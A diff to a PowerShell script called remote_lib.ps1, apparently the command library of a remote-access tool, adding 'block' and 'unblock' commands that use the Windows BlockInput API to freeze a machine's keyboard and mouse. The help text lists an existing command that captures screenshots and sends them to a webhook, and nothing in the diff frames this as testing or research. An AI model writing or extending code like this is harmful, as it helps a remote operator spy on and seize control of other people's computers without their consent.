@@ -37,11 +37,41 @@ function ss {
     echo "Your wish is my command."
 }
 
+function Init-BlockInput {
+    if (-not ("Win32.BlockInputHelper" -as [type])) {
+        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);' -Name "BlockInputHelper" -Namespace "Win32"
+    }
+}
+
+# Command: block - blocks keyboard/mouse input for a specified duration
+function block {
+    param([int]$Seconds = 5)
+    Init-BlockInput
+    $result = [Win32.BlockInputHelper]::BlockInput($true)
+    if (-not $result) {
+        Write-Warning "Failed to block input. Please run PowerShell as Administrator."
+        return
+    }
+    echo "Input blocked for $Seconds seconds."
+    Start-Sleep -Seconds $Seconds
+    [Win32.BlockInputHelper]::BlockInput($false) | Out-Null
+    echo "Input unblocked automatically."
+}
+
+# Command: unblock - manually restores keyboard/mouse input
+function unblock {
+    Init-BlockInput
+    [Win32.BlockInputHelper]::BlockInput($false) | Out-Null
+    echo "Input manually unblocked."
+}
+
 # Help command – list available remote‑library commands
 function hlp {
     $commands = @{
-        "ss"  = "capture a screenshot and send it to the webhook."
-        "hlp" = "Display this help information"
+        "ss"      = "capture a screenshot and send it to the webhook."
+        "block"   = "block keyboard and mouse input for a duration (default 5s)"
+        "unblock" = "manually unblock keyboard and mouse input"
+        "hlp"     = "Display this help information"
     }
     Write-Host "Remote Library Commands:`n"
     foreach ($k in $commands.Keys) {
@@ -50,6 +80,6 @@ function hlp {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'hlp')
+$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'hlp')
 
 # End of remote_lib.ps1
